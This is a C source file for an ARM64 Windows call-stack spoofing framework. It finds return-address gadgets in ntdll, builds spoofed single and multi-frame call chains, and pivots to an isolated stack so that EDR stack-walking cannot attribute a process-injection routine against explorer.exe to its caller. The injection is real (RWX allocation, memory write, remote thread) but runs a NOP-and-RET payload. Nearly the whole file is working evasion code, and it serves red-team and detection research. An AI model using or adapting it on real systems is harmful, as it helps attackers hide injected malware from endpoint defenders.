/*
 * ARM64 Call Stack Spoofing Framework for Windows
 * ================================================
 * Advanced call stack manipulation techniques for ARM64 architecture on Windows
 * 11
 *
 * Author: Alexander Hagenah (@xaitax)
 *
 * Description:
 * This framework demonstrates advanced stack spoofing techniques specifically
 * designed for ARM64 Windows systems. It implements call-site gadget discovery,
 * stack pivoting, and multi-frame chain spoofing to evade modern EDR
 * stack-walking analysis.
 *
 * Key Features:
 * - Call-site gadget randomization for signature resistance
 * - Stack pivoting with isolated execution contexts
 * - Multi-frame chain spoofing using recursion
 * - Unwind data (.pdata) alignment for EDR evasion
 *
 * Modification History:
 * Author: Davide Galdiero (taekwondodev)
 * Multi-frame recursion: chain spoofing also for the base case of the
 * recursion, to ensure that the walker based on .pdata see as top stack frame
 * the one with the spoofed return address.
 *
 * Target function replaced with InjectExplorer: realistic process-injection
 * pattern (OpenProcess + VirtualAllocEx RWX + WriteProcessMemory +
 * CreateRemoteThread) on explorer.exe, to trigger EDR behavioral detection
 * and demonstrate call-stack attribution evasion across all 4 spoofing
 * scenarios.
 *
 * Compilation:
 * cl /O2 /MT stack_spoof_arm64.c stack_spoof_arm64.obj /link /MACHINE:ARM64
 * dbghelp.lib
 *
 * DISCLAIMER:
 * This code is for authorized security research and education only.
 * Misuse of this code may violate laws and regulations.
 */

#include <windows.h>
#include <winternl.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "ntdll.lib")

/* ============================================================================
 * CONFIGURATION CONSTANTS
 * ============================================================================
 */

#define MAX_GADGETS 512
#define DEFAULT_STACK_SIZE 0x10000 // 64KB
#define ARM64_BL_MASK 0xFC000000
#define ARM64_BL_OPCODE 0x94000000

/* ============================================================================
 * EXTERNAL ASSEMBLY FUNCTIONS
 * ============================================================================
 */

/**
 * @brief Executes a function with a single spoofed return address
 * @param targetFunc Target function to execute
 * @param spoofedReturn Fake return address for stack walking
 * @param parameter Parameter to pass to target function
 * @param realReturnStorage Optional storage for real return address
 * @return Result from target function
 */
extern DWORD64 SpoofCallStack(void *targetFunc, void *spoofedReturn,
                              void *parameter, void **realReturnStorage);

/**
 * @brief Executes a function with multiple spoofed stack frames
 * @param targetFunc Target function to execute
 * @param spoofChain Array of spoofed return addresses
 * @param parameter Parameter to pass to target function
 * @param chainDepth Number of frames to spoof (1-4)
 * @return Result from target function
 */
extern DWORD64 SpoofCallStackAdvanced(void *targetFunc, void **spoofChain,
                                      void *parameter, DWORD chainDepth);

/**
 * @brief Gets the current stack pointer value
 * @return Current SP register value
 */
extern void *GetCurrentStackPointer(void);

/**
 * @brief Gets the current frame pointer value
 * @return Current FP (x29) register value
 */
extern void *GetCurrentFramePointer(void);

/**
 * @brief Executes a function on an isolated stack
 * @param targetFunc Target function to execute
 * @param fakeFrameData Structure containing fake stack context
 * @param parameter Parameter to pass to target function
 * @return Result from target function
 */
extern DWORD64 ExecuteWithFakeFrame(void *targetFunc, void *fakeFrameData,
                                    void *parameter);

/* ============================================================================
 * DATA STRUCTURES
 * ============================================================================
 */

/**
 * @brief Cache structure for storing discovered call-site gadgets
 *
 * This cache holds valid return addresses found after BL instructions
 * in legitimate modules. These addresses align with unwind data and
 * appear legitimate to stack walkers.
 */
typedef struct _GADGET_CACHE {
  void *addresses[MAX_GADGETS]; // Array of gadget addresses
  DWORD count;                  // Number of cached gadgets
  char moduleName[64];          // Source module name
} GADGET_CACHE;

/**
 * @brief Context structure for isolated stack execution
 *
 * Contains all necessary information to execute a function
 * on a completely separate stack, breaking normal stack walks.
 */
typedef struct _FAKE_FRAME_DATA {
  void *fakeFp;        // Spoofed frame pointer (x29)
  void *fakeLr;        // Spoofed link register (x30)
  void *fakeSp;        // Top of isolated stack
  DWORD64 reserved[5]; // Reserved for future use
} FAKE_FRAME_DATA;

/**
 * @brief Statistics for tracking framework operations
 */
typedef struct _SPOOF_STATS {
  DWORD totalExecutions;
  DWORD baselineExecutions;
  DWORD spoofAttempts;
  DWORD successfulSpoofs;
  DWORD gadgetsDiscovered;
  DWORD64 totalTimeMs;
} SPOOF_STATS;

/* ============================================================================
 * GLOBAL STATE
 * ============================================================================
 */

static GADGET_CACHE g_gadgetCache = {0};
static SPOOF_STATS g_stats = {0};

/* ============================================================================
 * TARGET FUNCTION
 * ============================================================================
 */

/**
 * @brief Realistic process-injection target: full injection pattern on
 * explorer.exe
 *
 * Simulates the classic worm/implant injection pattern:
 *   OpenProcess (PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD)
 *   VirtualAllocEx RWX
 *   WriteProcessMemory (ARM64 benign payload: 3x NOP + RET)
 *   CreateRemoteThread (executes payload, terminates immediately)
 *
 * This sequence triggers EDR behavioral detection (MDE ProcessAccess +
 * VirtualAlloc + WriteProcessMemory chain). The call stack visible to the
 * EDR at OpenProcess / CreateRemoteThread is what the spoofing techniques
 * manipulate across the 4 test scenarios.
 *
 * No harmful payload -- the injected bytes are 3 NOPs + RET. The behavioral
 * signal is the API call pattern itself, not the payload content.
 *
 * @param param Unused
 * @return TRUE if injection completed, FALSE on any API failure
 */
__declspec(noinline) BOOL WINAPI InjectExplorer(LPVOID param) {
    UNREFERENCED_PARAMETER(param);
    printf("\n  [>] Executing concealed function: InjectExplorer\n");
    printf("      Target: explorer.exe -- full injection pattern\n");

    printf("\n  [STACK TRACE] From inside InjectExplorer (user-mode view):\n");
    void *backtrace[12];
    USHORT frames = CaptureStackBackTrace(0, 12, backtrace, NULL);

    for (USHORT i = 0; i < frames; i++) {
        char buffer[sizeof(SYMBOL_INFO) + 256];
        PSYMBOL_INFO pSymbol = (PSYMBOL_INFO)buffer;
        pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
        pSymbol->MaxNameLen = 256;
        DWORD64 displacement = 0;

        if (SymFromAddr(GetCurrentProcess(), (DWORD64)backtrace[i],
                        &displacement, pSymbol)) {
            const char *marker = "";
            if (strstr(pSymbol->Name, "Inject"))
                marker = " <-- TARGET";
            else if (displacement == 0 && i == 1)
                marker = " <-- SPOOFED";

            printf("      [%02d] %-40s + 0x%04llX%s\n", i, pSymbol->Name,
                   displacement, marker);
        } else {
            printf("      [%02d] 0x%p (unresolved)\n", i, backtrace[i]);
        }
    }
    if (frames == 0)
        printf("      (no frames -- stack pivot active)\n");

    // Find explorer.exe PID
    DWORD explorerPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        printf("  [ERROR] CreateToolhelp32Snapshot failed (%lu)\n", GetLastError());
        return FALSE;
    }
    PROCESSENTRY32W pe = {sizeof(pe)};
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, L"explorer.exe") == 0) {
                explorerPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (!explorerPid) {
        printf("  [ERROR] explorer.exe not found\n");
        return FALSE;
    }
    printf("  [>] Found explorer.exe PID: %lu\n", explorerPid);

    // OpenProcess
    HANDLE hProc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE, explorerPid);
    if (!hProc) {
        printf("  [ERROR] OpenProcess failed (%lu)\n", GetLastError());
        return FALSE;
    }
    printf("  [>] OpenProcess handle: 0x%p\n", hProc);

    // VirtualAllocEx RWX
    LPVOID remMem = VirtualAllocEx(
        hProc, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remMem) {
        printf("  [ERROR] VirtualAllocEx failed (%lu)\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    printf("  [>] VirtualAllocEx RWX at: 0x%p\n", remMem);

    // ARM64 benign payload: 3x NOP + RET
    BYTE payload[] = {
        0x1F, 0x20, 0x03, 0xD5,  // NOP
        0x1F, 0x20, 0x03, 0xD5,  // NOP
        0x1F, 0x20, 0x03, 0xD5,  // NOP
        0xC0, 0x03, 0x5F, 0xD6   // RET
    };
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remMem, payload, sizeof(payload), &written)) {
        printf("  [ERROR] WriteProcessMemory failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProc, remMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    printf("  [>] WriteProcessMemory: %zu bytes written\n", written);

    // CreateRemoteThread -- executes NOP+RET payload, terminates immediately
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remMem, NULL, 0, NULL);
    if (!hThread) {
        printf("  [ERROR] CreateRemoteThread failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProc, remMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    printf("  [>] CreateRemoteThread: TID handle 0x%p\n", hThread);

    WaitForSingleObject(hThread, 2000);
    CloseHandle(hThread);
    VirtualFreeEx(hProc, remMem, 0, MEM_RELEASE);
    CloseHandle(hProc);

    printf("\n  [>] Injection complete -- payload executed in explorer.exe\n");
    return TRUE;
}

/* ============================================================================
 * UTILITY FUNCTIONS
 * ============================================================================
 */

/**
 * @brief Prints a formatted section separator
 */
void PrintSeparator(const char *title) {
  printf("\n");
  printf("====================================================================="
         "===========\n");
  printf("  %s\n", title);
  printf("====================================================================="
         "===========\n");
}

/**
 * @brief Prints the framework banner
 */
void PrintBanner(void) {
  printf("\n");
  printf("====================================================================="
         "===========\n");
  printf("                      ARM64 Call Stack Spoofing Framework            "
         "           \n");
  printf("                          Alexander Hagenah (@xaitax)                "
         "           \n");
  printf("====================================================================="
         "===========\n");
  printf("\n");
}

/**
 * @brief Prints system information
 */
void PrintSystemInfo(void) {
  SYSTEM_INFO sysInfo;
  GetNativeSystemInfo(&sysInfo);

  printf("System Information:\n");
  printf("  * Process ID:        %d\n", GetCurrentProcessId());
  printf("  * Thread ID:         %d\n", GetCurrentThreadId());
  printf("  * Architecture:      %s\n",
         (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64)
             ? "ARM64"
             : "Unknown/Emulated");
  printf("  * Processor Count:   %d\n", sysInfo.dwNumberOfProcessors);
  printf("  * Page Size:         0x%X bytes\n", sysInfo.dwPageSize);
  printf("\n");
}

/* ============================================================================
 * CORE EVASION ENGINE
 * ============================================================================
 */

/**
 * @brief Checks if a DWORD represents an ARM64 BL instruction
 */
#define IS_ARM64_BL(inst) (((inst) & ARM64_BL_MASK) == ARM64_BL_OPCODE)

/**
 * @brief Discovers and caches legitimate call-site gadgets from a module
 *
 * This function scans the .text section of a specified module for BL
 * (Branch with Link) instructions. The addresses immediately following
 * these instructions are valid return addresses that align with the
 * module's unwind data, making them perfect for spoofing.
 *
 * @param moduleName Name of the module to scan (e.g., "ntdll.dll")
 * @param cache Pointer to gadget cache structure
 * @return TRUE if gadgets were found, FALSE otherwise
 */
BOOL CacheCallSites(const char *moduleName, GADGET_CACHE *cache) {
  if (!cache || !moduleName) {
    printf("[ERROR] Invalid parameters for gadget discovery\n");
    return FALSE;
  }

  cache->count = 0;
  strncpy_s(cache->moduleName, sizeof(cache->moduleName), moduleName,
            _TRUNCATE);

  HMODULE hModule = GetModuleHandleA(moduleName);
  if (!hModule) {
    printf("[WARNING] Module '%s' not found in process\n", moduleName);
    return FALSE;
  }

  printf("[INFO] Scanning module: %s (Base: 0x%p)\n", moduleName, hModule);

  // Parse PE headers
  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
  if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
    printf("[ERROR] Invalid DOS signature in module\n");
    return FALSE;
  }

  PIMAGE_NT_HEADERS pNtHeaders =
      (PIMAGE_NT_HEADERS)((BYTE *)hModule + pDosHeader->e_lfanew);
  if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
    printf("[ERROR] Invalid NT signature in module\n");
    return FALSE;
  }

  // Find .text section
  PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
  BOOL textFound = FALSE;

  for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections;
       i++, pSectionHeader++) {
    if (strcmp((char *)pSectionHeader->Name, ".text") == 0) {
      textFound = TRUE;
      DWORD *pCurrent =
          (DWORD *)((BYTE *)hModule + pSectionHeader->VirtualAddress);
      DWORD *pEnd = (DWORD *)((BYTE *)pCurrent +
                              pSectionHeader->Misc.VirtualSize - sizeof(DWORD));

      printf("[INFO] Scanning .text section (Size: %d bytes)\n",
             pSectionHeader->Misc.VirtualSize);

      // Scan for BL instructions
      while (pCurrent < pEnd && cache->count < MAX_GADGETS) {
        if (IS_ARM64_BL(*pCurrent)) {
          cache->addresses[cache->count++] = (void *)(pCurrent + 1);
        }
        pCurrent++;
      }

      g_stats.gadgetsDiscovered = cache->count;

      if (cache->count > 0) {
        printf("[SUCCESS] Discovered %d call-site gadgets in %s\n",
               cache->count, moduleName);
        printf("[INFO] First gadget: 0x%p | Last gadget: 0x%p\n",
               cache->addresses[0], cache->addresses[cache->count - 1]);
      } else {
        printf("[WARNING] No suitable gadgets found in %s\n", moduleName);
      }

      return cache->count > 0;
    }
  }

  if (!textFound) {
    printf("[ERROR] .text section not found in module\n");
  }

  return FALSE;
}

/**
 * @brief Selects a random gadget from the cache
 *
 * This randomization prevents signature-based detection by ensuring
 * that spoofed return addresses are non-deterministic.
 *
 * @param cache Pointer to gadget cache
 * @return Random gadget address or NULL if cache is empty
 */
void *GetRandomGadget(GADGET_CACHE *cache) {
  if (!cache || cache->count == 0) {
    printf("[WARNING] Gadget cache is empty\n");
    return NULL;
  }

  DWORD index = rand() % cache->count;
  void *gadget = cache->addresses[index];

  printf("[DEBUG] Selected gadget[%d/%d]: 0x%p\n", index, cache->count, gadget);
  return gadget;
}

/**
 * @brief Helper structure for recursive multi-frame spoofing
 */
typedef struct _RECURSIVE_SPOOF_CONTEXT {
  void *targetFunc;
  void *parameter;
  void **spoofChain;
  DWORD currentDepth;
  DWORD maxDepth;
  DWORD64 result;
} RECURSIVE_SPOOF_CONTEXT;

/**
 * @brief Recursive helper to build genuine multi-frame spoofing
 * Each recursion level adds a real frame with a spoofed return address
 */
__declspec(noinline) static void
RecursiveSpoofHelper(RECURSIVE_SPOOF_CONTEXT *ctx) {
  if (ctx->currentDepth >= ctx->maxDepth) {
    void *baseGadget = ctx->spoofChain[ctx->currentDepth];
    ctx->result =
        SpoofCallStack(ctx->targetFunc, baseGadget, ctx->parameter, NULL);
    return;
  }

  // Get the spoofed return address for this level
  void *spoofedReturn = ctx->spoofChain[ctx->currentDepth];
  void *realReturn = NULL;

  // Increment depth for next recursion
  ctx->currentDepth++;

  // Use our single-frame spoofer at each recursion level
  // This creates a genuine frame with a spoofed return
  DWORD64 tempResult =
      SpoofCallStack((void *)RecursiveSpoofHelper, // Call ourselves recursively
                     spoofedReturn,                // With a spoofed return
                     ctx,                          // Pass context
                     &realReturn                   // Store real return
      );

  // Result is propagated through context structure
}

/* ============================================================================
 * TEST SCENARIOS
 * ============================================================================
 */

/**
 * @brief Scenario 1: Baseline direct injection (no spoofing)
 *
 * Ground truth: MDE/EDR sees the real call stack with stack_spoof.exe as
 * the attribution root. InjectExplorer caller chain fully visible.
 */
void TestInjectionBaseline(void) {
  PrintSeparator("SCENARIO 1: BASELINE -- DIRECT INJECTION (NO SPOOFING)");

  printf("\n[INFO] Direct call to InjectExplorer -- no stack manipulation\n");
  printf("[INFO] Expected: EDR sees real call chain, stack_spoof.exe attributed\n");

  LARGE_INTEGER start, end, freq;
  QueryPerformanceFrequency(&freq);
  QueryPerformanceCounter(&start);

  BOOL result = InjectExplorer(NULL);

  QueryPerformanceCounter(&end);
  DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;

  if (result) {
    printf("\n[SUCCESS] Baseline injection completed in %llu ms\n", elapsed);
  } else {
    printf("\n[FAILURE] Baseline injection failed in %llu ms\n", elapsed);
  }

  g_stats.totalExecutions++;
  g_stats.baselineExecutions++;
  g_stats.totalTimeMs += elapsed;
}

/**
 * @brief Scenario 2: Single-frame spoofed injection
 *
 * SpoofCallStack replaces the caller return address with a random ntdll gadget.
 * EDR sees ntdll as the caller of InjectExplorer -- stack_spoof.exe hidden.
 * CaptureStackBackTrace: InjectExplorer + ntdll gadget + NULL chain break.
 */
void TestInjectionSingleFrame(void) {
  PrintSeparator("SCENARIO 2: SINGLE-FRAME SPOOFED INJECTION");

  void *spoofedReturnGadget = GetRandomGadget(&g_gadgetCache);
  if (!spoofedReturnGadget) {
    printf("[ERROR] No gadgets available for spoofing\n");
    return;
  }

  printf("\n[INFO] Executing InjectExplorer with spoofed return address\n");
  printf("[INFO] Gadget source: %s\n", g_gadgetCache.moduleName);
  printf("[INFO] Spoofed return: 0x%p\n", spoofedReturnGadget);
  printf("[INFO] Expected: EDR sees ntdll as caller, stack_spoof.exe absent\n");

  void *realReturn = NULL;

  LARGE_INTEGER start, end, freq;
  QueryPerformanceFrequency(&freq);
  QueryPerformanceCounter(&start);

  DWORD64 result = SpoofCallStack(InjectExplorer, spoofedReturnGadget,
                                  NULL, &realReturn);

  QueryPerformanceCounter(&end);
  DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;

  printf("\n[SUCCESS] Single-frame spoofed injection completed in %llu ms\n",
         elapsed);
  printf("[INFO] Result: 0x%08llX\n", result);
  printf("[DEBUG] Real return address was: 0x%p\n", realReturn);

  g_stats.totalExecutions++;
  g_stats.spoofAttempts++;
  if (result)
    g_stats.successfulSpoofs++;
  g_stats.totalTimeMs += elapsed;
}

/**
 * @brief Scenario 3: Multi-frame chain spoofed injection
 *
 * RecursiveSpoofHelper builds CHAIN_DEPTH real frames, each with a spoofed
 * return address from ntdll. The resulting call chain is structurally valid
 * (.pdata-consistent, SP in TEB bounds) but attribution is fully redirected.
 * Hardest scenario for user-mode EDR to flag as anomalous.
 */
void TestInjectionMultiFrame(void) {
  PrintSeparator("SCENARIO 3: MULTI-FRAME CHAIN SPOOFED INJECTION");

#define CHAIN_DEPTH 2

  if (g_gadgetCache.count < CHAIN_DEPTH) {
    printf("\n[WARNING] Insufficient gadgets for %d-frame chain (have %d)\n",
           CHAIN_DEPTH, g_gadgetCache.count);
    return;
  }

  printf("\n[INFO] Building TRUE %d-frame deep call chain using recursive "
         "spoofing\n", CHAIN_DEPTH);
  printf("[INFO] Expected: structurally valid chain, SP in TEB bounds, "
         "attribution redirected to ntdll\n");

  void *spoofChain[CHAIN_DEPTH + 1];
  printf("\n  Multi-frame chain composition:\n");

  for (int i = 0; i <= CHAIN_DEPTH; i++) {
    spoofChain[i] = GetRandomGadget(&g_gadgetCache);
    printf("    Frame[%d]: 0x%p", i, spoofChain[i]);

    char buffer[sizeof(SYMBOL_INFO) + 256];
    PSYMBOL_INFO pSymbol = (PSYMBOL_INFO)buffer;
    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    pSymbol->MaxNameLen = 256;
    DWORD64 displacement = 0;

    if (SymFromAddr(GetCurrentProcess(), (DWORD64)spoofChain[i], &displacement,
                    pSymbol)) {
      printf(" (%s+0x%llX)", pSymbol->Name, displacement);
    }
    printf("\n");
  }

  RECURSIVE_SPOOF_CONTEXT ctx = {.targetFunc = InjectExplorer,
                                 .parameter = NULL,
                                 .spoofChain = spoofChain,
                                 .currentDepth = 0,
                                 .maxDepth = CHAIN_DEPTH,
                                 .result = 0};

  printf("\n[INFO] Executing with %d levels of recursion, each with spoofed "
         "return\n", CHAIN_DEPTH);

  LARGE_INTEGER start, end, freq;
  QueryPerformanceFrequency(&freq);
  QueryPerformanceCounter(&start);

  RecursiveSpoofHelper(&ctx);
  DWORD64 result = ctx.result;

  QueryPerformanceCounter(&end);
  DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;

  printf("\n[SUCCESS] Multi-frame spoofed injection completed in %llu ms\n",
         elapsed);
  printf("[INFO] Result: 0x%08llX\n", result);
  printf("[INFO] %d spoofed frames visible in call stack\n", CHAIN_DEPTH);

  g_stats.totalExecutions++;
  g_stats.spoofAttempts++;
  if (result)
    g_stats.successfulSpoofs++;
  g_stats.totalTimeMs += elapsed;
}

/**
 * @brief Scenario 4: Stack pivot injection
 *
 * ExecuteWithFakeFrame pivots SP to a VirtualAlloc'd region outside TEB bounds.
 * CaptureStackBackTrace returns 0 frames -- SP anomaly is the residual signature.
 * WinDbg emits WARNING and resolves at most 2 frames.
 */
void TestInjectionStackPivot(void) {
  PrintSeparator("SCENARIO 4: STACK PIVOT INJECTION");

  printf("\n[INFO] Preparing isolated execution environment\n");
  printf("[INFO] Expected: 0 frames from CaptureStackBackTrace, "
         "SP outside TEB bounds\n");

  SIZE_T fakeStackSize = DEFAULT_STACK_SIZE;
  void *fakeStackBase = VirtualAlloc(NULL, fakeStackSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  if (!fakeStackBase) {
    printf("[ERROR] Failed to allocate isolated stack (Error: %lu)\n",
           GetLastError());
    return;
  }

  printf("[SUCCESS] Allocated %zu KB isolated stack at 0x%p\n",
         fakeStackSize / 1024, fakeStackBase);

  void *fakeStackTop = (void *)((ULONG_PTR)fakeStackBase + fakeStackSize);
  FAKE_FRAME_DATA fakeFrame = {.fakeFp =
                                   (void *)((ULONG_PTR)fakeStackTop - 0x100),
                               .fakeLr = GetRandomGadget(&g_gadgetCache),
                               .fakeSp = fakeStackTop};

  printf("[INFO] Fake frame configuration:\n");
  printf("      FP: 0x%p\n", fakeFrame.fakeFp);
  printf("      LR: 0x%p\n", fakeFrame.fakeLr);
  printf("      SP: 0x%p  (outside TEB StackBase/StackLimit)\n",
         fakeFrame.fakeSp);

  LARGE_INTEGER start, end, freq;
  QueryPerformanceFrequency(&freq);
  QueryPerformanceCounter(&start);

  DWORD64 result = ExecuteWithFakeFrame(InjectExplorer, &fakeFrame, NULL);

  QueryPerformanceCounter(&end);
  DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;

  if (result) {
    printf("\n[SUCCESS] Stack pivot injection completed in %llu ms\n", elapsed);
  } else {
    printf("\n[FAILURE] Stack pivot injection failed in %llu ms\n", elapsed);
  }
  printf("[INFO] Stack isolation defeated user-mode stack walking\n");

  VirtualFree(fakeStackBase, 0, MEM_RELEASE);
  printf("[DEBUG] Released isolated stack memory\n");

  g_stats.totalExecutions++;
  g_stats.spoofAttempts++;
  if (result)
    g_stats.successfulSpoofs++;
  g_stats.totalTimeMs += elapsed;
}

/**
 * @brief Prints execution statistics
 */
void PrintStatistics(void) {
  PrintSeparator("EXECUTION STATISTICS");

  printf("\n");
  printf("  Performance Metrics:\n");
  printf("    * Total Executions:     %d\n", g_stats.totalExecutions);
  printf("    * Baseline Tests:       %d\n", g_stats.baselineExecutions);
  printf("    * Spoofing Attempts:    %d\n", g_stats.spoofAttempts);
  printf("    * Successful Spoofs:    %d\n", g_stats.successfulSpoofs);
  printf("    * Gadgets Discovered:   %d\n", g_stats.gadgetsDiscovered);

  if (g_stats.totalExecutions > 0) {
    DWORD64 avgTime = g_stats.totalTimeMs / g_stats.totalExecutions;
    printf("    * Average Exec Time:    %llu ms\n", avgTime);

    if (g_stats.spoofAttempts > 0) {
      double successRate =
          (double)g_stats.successfulSpoofs / g_stats.spoofAttempts * 100.0;
      printf("    * Spoofing Success:     %.1f%%\n", successRate);
    }
  }

  printf("\n  Security Analysis:\n");
  printf("    * EDR Evasion Level:    ");

  if (g_stats.spoofAttempts > 0 &&
      g_stats.successfulSpoofs == g_stats.spoofAttempts) {
    printf("MAXIMUM (All spoofing techniques successful)\n");
  } else if (g_stats.spoofAttempts > 0 &&
             g_stats.successfulSpoofs >= g_stats.spoofAttempts * 0.75) {
    printf("HIGH (Most spoofing techniques successful)\n");
  } else {
    printf("MEDIUM (Partial spoofing success)\n");
  }

  printf("    * Detection Surface:    ");
  if (g_stats.gadgetsDiscovered > 500) {
    printf("MINIMAL (Maximum gadget entropy: %d gadgets)\n",
           g_stats.gadgetsDiscovered);
  } else if (g_stats.gadgetsDiscovered > 100) {
    printf("LOW (High gadget entropy: %d gadgets)\n",
           g_stats.gadgetsDiscovered);
  } else {
    printf("MODERATE (Limited gadget pool: %d gadgets)\n",
           g_stats.gadgetsDiscovered);
  }

  printf("    * Technique Coverage:   ");
  printf("Baseline | Single-Frame | Multi-Frame | Stack Pivot\n");
}

/* ============================================================================
 * MAIN ENTRY POINT
 * ============================================================================
 */

int main(void) {
  PrintBanner();
  PrintSystemInfo();

  // Initialize random seed
  srand((unsigned int)time(NULL));

  // Initialize symbol handler
  printf("[INFO] Initializing symbol handler...\n");
  if (!SymInitialize(GetCurrentProcess(), NULL, TRUE)) {
    printf("[ERROR] Failed to initialize symbols (Error: %lu)\n",
           GetLastError());
    return EXIT_FAILURE;
  }
  SymSetOptions(SYMOPT_LOAD_LINES | SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
  printf("[SUCCESS] Symbol handler initialized\n");

  // Build gadget cache
  printf("[INFO] Building gadget cache from system modules...\n");
  if (!CacheCallSites("ntdll.dll", &g_gadgetCache)) {
    printf("[ERROR] Failed to build gadget cache - spoofing not viable\n");
    SymCleanup(GetCurrentProcess());
    return EXIT_FAILURE;
  }

  // Execute test scenarios
  TestInjectionBaseline();
  TestInjectionSingleFrame();
  TestInjectionMultiFrame();
  TestInjectionStackPivot();

  // Print summary
  PrintStatistics();

  printf("\n");
  printf("[SUCCESS] All injection scenarios completed\n");

  // Cleanup
  SymCleanup(GetCurrentProcess());

  return EXIT_SUCCESS;
}
